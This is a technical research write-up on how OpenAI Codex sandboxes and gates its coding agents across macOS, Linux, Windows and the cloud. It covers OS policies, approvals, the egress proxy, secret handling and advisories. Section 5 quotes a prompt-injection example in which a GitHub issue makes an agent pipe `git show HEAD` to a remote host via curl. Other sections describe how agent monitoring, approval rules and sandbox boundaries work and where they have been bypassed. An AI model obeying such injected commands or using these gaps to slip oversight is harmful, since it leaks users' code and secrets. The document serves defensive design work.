# How OpenAI Codex workplaces its own models (research, 2026-09-29)

## Sources
- Repo: https://github.com/openai/codex, shallow clone in `./src`, commit `18194bfd3534ca567d886eac454028dafaa68b6c` (2026-09-29 15:10 UTC). Code citations below are relative to `src/codex-rs/`.
- Docs: `developers.openai.com/codex/*` now redirects to `learn.chatgpt.com/docs/*`. Raw copies are in `./web/*.txt` (fetched 2026-09-29): https://developers.openai.com/codex/cloud/environments -> learn.chatgpt.com/docs/environments/cloud-environment; https://developers.openai.com/codex/cloud/internet-access -> learn.chatgpt.com/docs/cloud/internet-access; https://developers.openai.com/codex/concepts/sandboxing -> learn.chatgpt.com/docs/sandboxing; https://developers.openai.com/codex/agent-approvals-security -> learn.chatgpt.com/docs/agent-approvals-security ("AAS" below); https://developers.openai.com/codex/config-reference -> learn.chatgpt.com/docs/config-file/config-reference
- Advisories: GitHub API `repos/openai/codex/security-advisories` and global `advisories` (queried 2026-09-29).
- Method: three read-only code-reading agents plus my own greps. I re-checked the surprising claims myself: `*` wildcard handling, protected names, `ignore_default_excludes`, the `on-failure` alias, `wants_no_sandbox_approval`, and the missing safe-command list. I did not execute any of the sandboxes.

## 0. Big picture
- Codex draws two separate boundaries (AAS; sandboxing page): **sandbox**: OS-enforced limits on what spawned commands can technically do; **approval policy**: when the agent must stop and ask to cross that boundary.
- Local defaults: no network, writes limited to the workspace (AAS l.11, l.40).
- Code has moved from the old `SandboxPolicy` enum to `PermissionProfile`: `Managed{file_system, network} | Disabled | External{network}` (`protocol/src/models.rs:422-436`); built-in profiles `:read-only`, `:workspace`, `:danger-full-access` (`models.rs:410-416`); the legacy `SandboxPolicy` still exists (`protocol/src/protocol.rs:1072-1118`).

## 1. Local CLI sandbox

### 1a. macOS Seatbelt
- Always runs `/usr/bin/sandbox-exec` by absolute path, never via PATH, to avoid a spoofed binary (`sandboxing/src/seatbelt.rs:58-62`).
- Invocation: `sandbox-exec -p <policy> -D<KEY>=<path>... -- cmd` (`seatbelt.rs:1099-1107`). Sets `CODEX_SANDBOX=seatbelt` (`core/src/spawn.rs:22-26`).
- The policy is assembled at `seatbelt.rs:1047-1087`, in this order: base, file-read, file-write, network; preferences (only when reads are unrestricted); platform defaults (only for `:minimal` reads); daemon-socket denies; `(deny mach-lookup (xpc-service-name-prefix ""))`; unreadable-glob denies; unlink denies on protected ancestors; `(deny system-fcntl (fcntl-command 80 110))`: F_MAKECOMPRESSED and F_TRANSFEREXTENTS "mutate files through read-only descriptors" (`:1082-1087`).
- Base policy `sandboxing/src/seatbelt_base_policy.sbpl`: `(deny default)` (:8); process-exec and process-fork allowed (:11-12); `signal` and `process-info*` only for the same sandbox (:13, :16); write `/dev/null` (:18-21); sysctl-read allowlist (:24-77); sysctl-write only `kern.grade_cputype` (:81-82); mach-lookup only `opendirectoryd.libinfo` and `PowerManagement.control` (:90-92, :103-105); POSIX sem and KMP shm (:95-101); PTY via `/dev/ptmx`; ttys need a sandbox extension, but ioctl is allowed on pre-created ptys (:108-116).
- **Reads**: unrestricted mode is `(allow file-read*)`, the default for the built-in profiles (`seatbelt.rs:985-990`); `/` minus `READABLE_ROOT_0_EXCLUDED_n` when deny-read entries exist (:991-1004); restricted mode allows only `READABLE_ROOT_n` (:1007-1024). `:minimal` adds `seatbelt_read_only_platform_defaults.sbpl`: system libs and frameworks, `/etc`, `/bin`, `/usr/bin`, ..., plus ~20 more mach services (logd, trustd, diagnosticd, notification_center, ... :111-147). `seatbelt_preferences_policy.sbpl` (cfprefsd) is added only with full-disk read, because it "can expose data outside the filesystem read roots" (:3-8).
- **Writes**: full-disk write is `(allow file-write* (regex #"^/"))` (`seatbelt.rs:949-952`); otherwise each writable root becomes param `WRITABLE_ROOT_n` (subpath for dirs, literal for files) (:498-532); the root dir itself is denied `file-write-unlink` (:522-528); exclusions `WRITABLE_ROOT_n_EXCLUDED_m` (plus `_RESOLVED` symlink target) are emitted as both `require-not literal` and `require-not subpath`, so `mkdir .codex` is blocked too (:545-573); protected names are also enforced by regex `^root/name(/.*)?$` (:576-607); writable roots containing symlinks are rejected unless `allow_symlinked_codex_home` is set (:440-460).
- **Network** (`seatbelt.rs:319-384`): enabled, no proxy: `(allow network-outbound)(allow network-inbound)`, plus `seatbelt_network_policy.sbpl` (AF_SYSTEM; mach networkd, DNSConfiguration, configd, ocspd, SecurityServer, trustd) and TLS (`TrustEvaluationAgent`) (:372-380); proxy mode: outbound only to `localhost:<proxy port>` (:344-347); `allow_local_binding` adds localhost bind/in/out and `*:53` (:334-343); proxy config with no usable port, or managed network with no endpoint, gives an empty policy, i.e. fail closed (:360-370); network off: no network rule at all (deny default). Unix sockets are per-path params, or `AF_UNIX` everywhere when AllowAll (:281-301).

### 1b. Linux: bubblewrap + seccomp by default (Landlock is legacy)
- Docs: "Linux uses bwrap plus seccomp by default" (AAS l.319).
- Legacy Landlock (`--use-legacy-landlock`) is rejected for restricted-filesystem policies because it "cannot isolate app-server Unix sockets" (`linux-sandbox/README.md:26,40-43`).
- The Landlock function is marked "currently unused" (`linux-sandbox/src/landlock.rs:145-146`).
- `bwrap` comes from PATH (outside cwd), else a bundled helper that needs unprivileged userns (`README.md:10-16`; sandboxing page l.43-55). WSL1 is unsupported since 0.115 (AAS l.320).
- Two stages (`linux_run_main.rs:120-125,201-262`): 1. outer: bwrap; 2. inner: re-exec the helper, assert no effective/permitted caps, set up the proxy bridge, `PR_SET_NO_NEW_PRIVS`, apply seccomp, exec. Seccomp comes last because bwrap may be setuid.
- bwrap flags (`bwrap.rs:355-398`): `--new-session --die-with-parent --unshare-user --unshare-ipc --cap-drop ALL`; `--unshare-pid` unless the PID namespace is inherited; `--unshare-net` unless full access (:101-117); `--proc /proc`, keeping the inherited /proc if that mount is refused.
- Filesystem (`bwrap.rs:408-424,511-756`): full read: `--ro-bind / /` then `--dev /dev` (null, zero, full, random, urandom, tty only); restricted read: `--tmpfs /` plus ro-binds (`:minimal` = /bin /sbin /usr /etc /lib /lib64 /nix/store ...); writable roots: `--bind`, with protected subpaths re-bound `--ro-bind`; a symlink or missing protected path gets `/dev/null` mounted over it (`README.md:78-80`); unreadable globs are expanded with rg at launch, capped at 8192. This is a snapshot: new matching files are not covered (`bwrap.rs:61,494-507`).
- Seccomp (`linux-sandbox/src/landlock.rs:188-292`, default action Allow, EPERM on match, x86_64/aarch64 only): denied in all modes: `io_uring_*` (it can make AF_VSOCK without `socket()`); denied in all modes except VmSocketRestricted: `ptrace`, `process_vm_readv`, `process_vm_writev`. **Restricted** (network off): deny connect, accept(4), bind, listen, getpeername, getsockname, shutdown, sendto, sendmmsg, recvmmsg, get/setsockopt; `socket`/`socketpair` only for AF_UNIX. `recvfrom` is deliberately allowed (cargo clippy); `sendmsg`/`recvmsg` are not in the list (:202-231). **ProxyRouted**: `socket` only for AF_INET/AF_INET6 (AF_UNIX only if `dangerously_allow_all_unix_sockets`); `socketpair` only AF_UNIX (:233-268). **VmSocketRestricted**: network on with restricted writes denies only AF_VSOCK (WSL2 interop) (:57-64,270-278).
- Net off is enforced in **both** layers, a netns (`--unshare-net`) and seccomp. Proxy mode is described in 4b.

### 1c. Windows (native)
- Levels: `Disabled` (default), `RestrictedToken`, `Elevated` (`protocol/src/config_types.rs:297-302`). Docs name them `[windows] sandbox = "unelevated" | "elevated"` (AAS l.326-329).
- Unelevated: `CreateRestrictedToken(DISABLE_MAX_PRIVILEGE|LUA_TOKEN|WRITE_RESTRICTED)` with random per-root capability SIDs (`windows-sandbox-rs/src/token.rs:42-44,481-523`); write-allow ACEs on writable roots, deny-write ACEs on read-only paths (`acl.rs:684-765`); it cannot deny reads (`lib.rs:717-726`); **network block is env-only**: dead proxy `127.0.0.1:9`, offline flags for pip/npm/cargo, and ssh/scp stubs (`env.rs:126-178`). No kernel enforcement found on this path.
- Elevated: local users `CodexSandboxOffline`/`CodexSandboxOnline` (`setup.rs:53-54`); Windows Firewall rules scoped to the offline user's SID block non-loopback in/out, and loopback except the proxy ports (`setup_provisioning/firewall.rs:35-218`); WFP filters block ICMP, DNS 53/853 and SMB (`wfp/filter_specs.rs:28-121`); managed network requires Elevated (`sandboxing/src/manager.rs:533-539`).
- `mxc-sandbox`: new backend on Microsoft MXC `BaseContainerRunner`/PSEC, with kernel FS deny lists and loopback-only egress (proxy); never falls back to another backend (`mxc-sandbox/README.md:3-37`).
- AppContainer is not used by `windows-sandbox-rs`.
- Process hardening (`process-hardening/src/lib.rs`): dumpable=0 / PT_DENY_ATTACH, RLIMIT_CORE=0, strip `LD_*`/`DYLD_*`. It is only wired into responses-api-proxy, voice-host and the Linux proxy bridge; I found no call from the main CLI.

## 2. Sandbox modes and defaults
- Modes are `read-only` (the enum default), `workspace-write`, `danger-full-access` (`protocol/src/config_types.rs:104-113`); the profile equivalents are listed in section 0.
- **Default choice** (`config/src/config_toml.rs:819-879`; `core/src/config/permissions.rs:51-62`): project with any trust decision -> workspace-write; no trust entry -> read-only. The docs describe it differently: VCS folder -> Auto (workspace-write + on-request), non-VCS -> read-only (AAS l.207-210). Not reconciled; the code keys on the trust entry.
- **Writable roots** (`protocol.rs:1247-1335`; `permissions.rs:819-874`): configured `writable_roots` + cwd; `/tmp` if it exists and `exclude_slash_tmp` is false; `$TMPDIR` if set and `exclude_tmpdir_env_var` is false (both default false, so both included).
- **network_access**: bool, default false (`protocol.rs:1079-1107`; `config/src/types.rs:1104-1112`; AAS l.68-70).
- **Protected subpaths** (`PROTECTED_METADATA_PATH_NAMES`, `protocol/src/permissions.rs:40-51`; logic at :2347-2390): `.git`: dir or file; a `gitdir:` pointer's resolved dir is protected too; `.agents`: if it is a dir; `.codex`: if it exists, **or when missing if the root is the cwd**, so creating it needs approval; `.aws`: if it is a dir. The code comment says profiles can pick credential helpers. **The docs list only .git/.agents/.codex (AAS l.216-222); `.aws` is code-only.**; Protection is recursive.
- **Env filtering** (`shell_environment_policy`; `protocol/src/shell_environment.rs:90-160`): `inherit` = all (default) | core | none; `ignore_default_excludes` **defaults to true** (`config/src/shell_environment_policy.rs:136`; config-reference l.289). **By default the `*KEY*`/`*SECRET*`/`*TOKEN*` filter is OFF and secrets in the parent env reach sandboxed commands.**; Then `exclude` -> `set` -> `include_only` (or the new `filters` map) -> add `CODEX_THREAD_ID`. Always stripped: 5 internal tokens (`NODE_REPL_AUTH_TOKEN`, `OPENAI_IDENTITY_TOKEN_FILE`, ... `shell_environment.rs:14-20`). Core set: PATH SHELL TMPDIR TEMP TMP HOME LANG LC_ALL LC_CTYPE LOGNAME USER (:163-166). Injected vars: `CODEX_SANDBOX_NETWORK_DISABLED=1` (`core/src/spawn.rs:91-93`); `CODEX_SESSION_ID`, `CODEX_VERSION`, `CODEX_PERMISSION_PROFILE` (informational, `core/src/exec_env.rs:41-71`); proxy vars (see 4b).

## 3. Approvals, escalation, exec-policy
- `AskForApproval` (`protocol.rs:986-1026`): `untrusted` (UnlessTrusted); `on-request` (default; **`on-failure` is only a serde alias**, :994-996); `granular{sandbox_approval, rules, skill_approval, request_permissions, mcp_elicitations}`; false = auto-reject that category; `never`.
- **`untrusted` is retired as a config value** and makes startup fail (`core/src/config/mod.rs:228-231,3731-3736`; AAS l.15-33). It survives internally: untrusted projects with no explicit policy get UnlessTrusted (`mod.rs:3739-3749`).
- Shell tool args (`core/src/tools/handlers/shell_spec.rs:232-278`): `sandbox_permissions`: use_default | require_escalated | with_additional_permissions; `justification`; `prefix_rule` (suggested reusable rule); `additional_permissions{network, file_system}`. A separate `request_permissions` tool exists. The old `with_escalated_permissions` is gone.
- Flow (`core/src/tools/orchestrator.rs:122-460`; `core/src/tools/sandboxing.rs:195-338`): 1. approve up front if needed; 2. run sandboxed. The sandbox is skipped only for `require_escalated` or a full exec-policy allow, and never when deny-read entries exist (:276-296); 3. on sandbox denial, retry unsandboxed with approval only for UnlessTrusted or granular `sandbox_approval`. **OnRequest and Never do not offer that retry** (:331-338), except for managed-network denials. The model must ask for escalation proactively.
- Answers (`protocol.rs:4159-4194`): approve, approve-for-session, approve + persist exec-policy amendment, network amendment, deny, timeout, abort.
- Auto-review ("guardian"): `approvals_reviewer = user | auto_review`, only with on-request or granular (`ext/guardian-reviewer/src/routing.rs:54-62`); the reviewer agent looks for exfiltration, credential probing, persistent weakening and destruction; fails closed on errors (AAS l.228-261).
- **No safe-command whitelist at this commit.** `is_known_safe_command` exists only as a name in `core/src/exec_policy_tests.rs`, not in production code. What remains is `shell-command/src/command_safety/is_dangerous_command.rs`: `rm -f`, looking through `sudo`/`env`/`trap`/`bash -lc`; more than 8 levels of nesting counts as dangerous. Unmatched commands under OnRequest in a restricted sandbox: Allow, unless the model asked for escalation (`core/src/exec_policy.rs:770-855`).
- **execpolicy** (Starlark `.rules`, "in preview" `execpolicy/README.md:97`): `prefix_rule(pattern, decision=allow|prompt|forbidden, justification, match, not_match)`, `host_executable`, `network_rule(host, protocol, decision)`; the strictest decision wins. Rules load from `<layer>/rules/*.rules` across config layers, with an admin requirements overlay on top (`exec_policy.rs:662-716`). `bash -lc` scripts are split and each command is evaluated (:876-904). An allow bypasses the sandbox only if every segment matches an explicit allow (:440-454).
- "Always allow" appends `prefix_rule(..., decision="allow")` to `$CODEX_HOME/rules/default.rules` (`execpolicy/src/amend.rs:65-125`; `exec_policy.rs:464-512,867-869`). Banned prefixes cannot be persisted: shells with `-c`, python, node, git, rm, sudo, env, powershell, ... (`exec_policy.rs:57-146`).
- `shell-escalation` crate: a patched zsh with an `EXEC_WRAPPER` intercepts each `execve` and asks the server over `CODEX_ESCALATE_SOCKET` for `Run` (sandboxed) | `Escalate` (unsandboxed) | `Deny` (`shell-escalation/README.md`; `core/src/tools/runtimes/zsh_fork.rs`).

## 4. Network in the local CLI

### 4a. Base sandbox is all-or-nothing
- Without the proxy, network is a single bool (`protocol.rs:1079-1107`): Seatbelt: blanket allow in/out; Linux: netns + seccomp when off, direct egress when on.
- Docs: "Network on + network_proxy off: network stays on with unrestricted direct outbound access" (AAS l.93-94).

### 4b. Optional allowlisting proxy (`network-proxy` crate)
- Gating: feature `network_proxy`, Experimental, default off (`features/src/lib.rs:198-199,1303-1311`); it only narrows access that the profile already grants (`core/src/config/network_config.rs:98-111`; AAS l.71-96); admin `experimental_network` requirements can start it without the feature flag (AAS l.112-116).
- Listeners (`network-proxy/README.md:3-10`; `src/config.rs:406-411`): in-process Rust (Rama + rustls); HTTP proxy at `127.0.0.1:3128`, SOCKS5 at `127.0.0.1:8081` (UDP too); non-loopback bind is clamped unless `dangerously_allow_non_loopback_proxy`.
- Policy: `domains = {pattern = allow|deny}`; with no allow entries, everything is blocked. Patterns: exact; `*.x` = subdomains only; `**.x` = apex + subdomains; `?` = one char. Deny always wins. Global `*` is accepted for allow and rejected for deny (`src/policy.rs:193-229`; AAS l.117-125). One sub-agent claimed `*` is rejected outright; I checked the code and that is wrong.
- Modes (`src/config.rs:386-402`; `README.md:143-145,252-255`): `full` (default) | `limited`. Limited allows only GET/HEAD/OPTIONS. HTTPS in limited mode requires MITM; otherwise CONNECT to :443 is blocked. SOCKS5 is blocked in limited mode. MITM CA key is in memory only; its public cert is exported via CA-bundle env vars (`README.md:40-43,107-110`).
- Local/private blocking (`src/runtime.rs:701-784`; `src/policy.rs:55-120`): loopback, RFC1918, link-local, CGNAT and ULA are blocked unless `allow_local_binding` or an exact IP/localhost allow; hostnames that resolve to non-public IPs are blocked even if allowlisted; DNS failure blocks the request; connect-time re-check of the resolved address (`src/connect_policy.rs:76-117`). Still documented as best-effort vs DNS rebinding; enforce egress lower too (`README.md:266-268`; AAS l.136-144).
- Forcing traffic through it: env vars `HTTP(S)_PROXY`, `ALL_PROXY=socks5h://`, npm/yarn/pip/docker/bundle variants, `NODE_USE_ENV_PROXY=1`, and `GIT_SSH_COMMAND` via `nc -X 5` on macOS; `NO_PROXY` is empty unless local binding is on (`src/proxy.rs:720-859`). These are only hints. **Enforcement** is: Seatbelt: outbound only to the proxy ports; Linux: `--unshare-net` plus in-netns loopback listeners bridged to the host proxy through socketpair fds with an attribution frame (no veth), and seccomp ProxyRouted (`linux-sandbox/src/proxy_routing.rs:131-457`); Windows elevated: firewall allowing only loopback proxy ports.
- Unknown domain (allowlist miss): the user is asked (once / session / persist as execpolicy `network_rule`); deny and local blocks are never promptable (`src/network_policy.rs:363-399`; `core/src/tools/network_approval.rs:625-990`); no prompt under `never`.
- Audit: OTEL `codex.network_proxy.policy_decision` (host/port/method, no full URLs), and `CODEX_NETWORK_POLICY_VIOLATION` log lines (`README.md:191-228`; `src/runtime.rs:51,156-166`).
- **Credential broker** (`src/credential_broker.rs`; `src/runtime.rs:504,607`): children get dummy values for credential env vars; MITM swaps in the real value in outbound headers for matched destinations; `dangerously_allow_plaintext_credential_injection` exists (`src/config.rs:130-175`). I did not read the provider/matching submodules in detail.
- Out of scope for the proxy: web search (a hosted Responses tool, `web_search = cached` default, `live` under full access; `core/src/tools/hosted_spec.rs:14-20`), MCP servers, connectors, browser, and the client's own model/auth traffic (AAS l.184-205).

## 5. Codex cloud (web)
Everything in this section comes from the docs. The cloud runtime is not in the open repo.
- **Container**: an OpenAI-managed isolated container per task; the repo is checked out at the chosen branch/SHA; default image `universal`, with the reference Dockerfile at `openai/codex-universal` (environments l.11,16-21; AAS l.39). Container state is cached up to 12h. For Business/Enterprise the cache is **shared across all users of the environment** (environments l.40-51).
- **Phases**: the setup script (plus an optional maintenance script on cache resume) runs **with internet**, in a separate bash session, so `export` does not persist; then the agent phase runs the command loop (environments l.9-15,37-39).
- **Secrets**: stored with extra encryption and available **only to setup scripts**; "removed before the agent phase starts". Plain env vars last the whole task (environments l.23-27; AAS l.39).
- **Agent internet**: **off by default**, configured per environment (internet-access l.7,70-73): Off, or On with a domain allowlist preset: `None` (empty + custom), `Common dependencies` (~70 registries/VCS/package domains, internet-access l.86-156; it includes broad ones like `google.com`, `microsoft.com`, `github.com`, `githubusercontent.com`, `azure.com`), or `All (unrestricted)`; custom domains can be added to None or Common; optional method restriction to GET/HEAD/OPTIONS (l.74-81).
- **Enforcement**: docs: "Environments run behind an HTTP/HTTPS network proxy ... All outbound internet traffic passes through this proxy" (environments l.52-54). The mechanism (DNS, firewall, how non-HTTP traffic is handled, TLS interception or not) is **not documented; unconfirmed**. Inference only: the docs' sample output shows an `X-Envoy-Expected-Rq-Timeout-Ms` header, which suggests an Envoy egress proxy, and method filtering on HTTPS would imply TLS interception. Neither is confirmed.
- **Documented risks** (internet-access l.8-69): prompt injection from web content, code/secret exfiltration, malware or vulnerable dependencies, license-restricted content. The worked example is a GitHub issue that tells the agent to run `git show HEAD | curl -X POST ... httpbin.org`, and the agent leaks the commit. Advice: allowlist only needed domains and methods, and review the logs.

## 6. Limitations, bypasses, advisories
- **GHSA-w5fx-fh39-j5rw / CVE-2025-59532** (high, 2025-09-19): the model-supplied `cwd` was treated as the writable root, allowing arbitrary writes and exec outside the workspace; the network block was unaffected; fixed in CLI 0.39.0 / IDE 0.4.12 by deriving the boundary from the session start dir.
- **GHSA-xrxf-jgv3-qmrm / CVE-2025-61260** (critical, published 2026-04-14, CLI <= 0.23.0): the project-local `.env` and `.codex/config.toml` (MCP servers) were auto-loaded, so opening a malicious repo meant code execution. This is the motivation (my inference) for `.codex` being protected and for untrusted projects disabling project config (AAS l.31).
- Documented limitations: DNS rebinding is only best-effort (AAS l.136-144); Linux sandbox may not work inside Docker, in which case they suggest danger-full-access inside a container you secured yourself (AAS l.331-332); devcontainer + full access means anything in the container, **including Codex credentials**, can be exfiltrated (AAS l.336-341); the reference devcontainer firewall needs its own DNS-refresh / rebinding protections (AAS l.359).
- Limitations noted in code: Linux Restricted seccomp allows `recvfrom`, and `sendmsg`/`recvmsg` are not listed (`linux-sandbox/src/landlock.rs:213-216`); `--inherit-pid-namespace` lets commands signal same-UID processes (`linux-sandbox/README.md:102-104`); unreadable globs are a launch-time snapshot; Windows unelevated has no kernel network block and no deny-read; macOS needs explicit unlink/rename and fcntl denies to stop protected paths being moved out from under carve-outs (`seatbelt.rs:919-927,1082-1084`).
- Open issues. These are reporter claims, not confirmed: #44964: admin `prefix_rules` don't fire for nested shell scripts (`zsh -c`); #37405: allowlisted commands lose their bypass in compound commands.
- Safety monitoring can pause a task asynchronously, possibly after the harmful action; it does not replace the sandbox (AAS l.44-52).

## 7. Relevant to remote-workplace
Legend: [F] = fact from source; [I] = my inference.

**(a) Allowlisted egress proxy**
- [F] Codex doesn't trust proxy env vars alone. It pairs them with kernel enforcement: Seatbelt outbound only to proxy ports; Linux netns + fd-bridged loopback listener + seccomp limiting socket families; Windows firewall on proxy ports.
- [F] Fail closed: a proxy configured but unreachable means no network; a DNS failure blocks; resolved private IPs are blocked even when allowlisted; the address is re-checked at connect time.
- [F] Grammar: allowlist-first, deny wins, `*.x` vs `**.x`, global `*` only for allow.
- [F] GET/HEAD/OPTIONS-only mode requires MITM for HTTPS; the cloud offers the same knob.
- [F] Codex's own docs call domain allowlisting best-effort against DNS rebinding and recommend lower-layer enforcement. [I] Pin resolved IPs at connect time, as `connect_policy.rs` does, and refuse raw TCP/UDP that doesn't go through the proxy.
- [F] Cloud "Common dependencies" includes very broad domains (github.com, githubusercontent.com, google.com). The docs' own exfil demo is a POST to an arbitrary host. [I] Method restriction plus narrow domains matter more than the preset.
- [F] Credential broker: children see dummy secrets and the proxy injects the real ones for matched hosts. [I] This model fits workplace workers that need API tokens without being able to read them.
- [F] Proxy decisions are logged per host/port/method without URLs.

**(b) Protected paths**
- [F] Inside writable roots, `.git` (and the resolved gitdir target), `.agents`, `.codex`, `.aws` are recursively read-only.
- [F] Creating a missing `.codex` in the cwd is blocked too.
- [F] Seatbelt adds unlink denies on the root and on protected ancestors, symlink-root rejection, and fcntl 80/110 denies. [I] Rename, symlink and descriptor tricks all have to be closed, not just `write`.
- [F] CVE-2025-59532 shows that the writable-root anchor must come from the host session and never from a model-supplied `cwd`.

**(c) Environment scrubbing**
- [F] The local default inherits the **whole** env, and the KEY/SECRET/TOKEN filter is off by default. Only 5 internal Codex tokens are always stripped.
- [F] The cloud drops secrets before the agent phase (setup-only secrets).
- [I] Codex's local default is weak. remote-workplace should start from an allowlist (like `inherit=core`) and not copy Codex's local default.

**(d) Approvals**
- [F] Approvals are a separate layer from the sandbox. The `untrusted` config value is retired and `on-failure` is just an alias for `on-request`.
- [F] Under on-request there is no automatic retry-unsandboxed after a denial; the model must ask up front with a justification.
- [F] The persisted "always allow" refuses interpreter/shell/git/rm/sudo prefixes.
- [F] Allow rules bypass the sandbox only when every segment of a split `bash -lc` script matches.
- [F] Deny-read policies disable all sandbox bypasses.
- [F] The optional LLM auto-reviewer fails closed, and async monitoring may pause a task only after the fact.
- [I] Prefix-rule matching on shell text is bypassable (open issue #44964). remote-workplace should not lean on command-prefix approvals as a security boundary; the kernel/proxy layer must hold on its own.
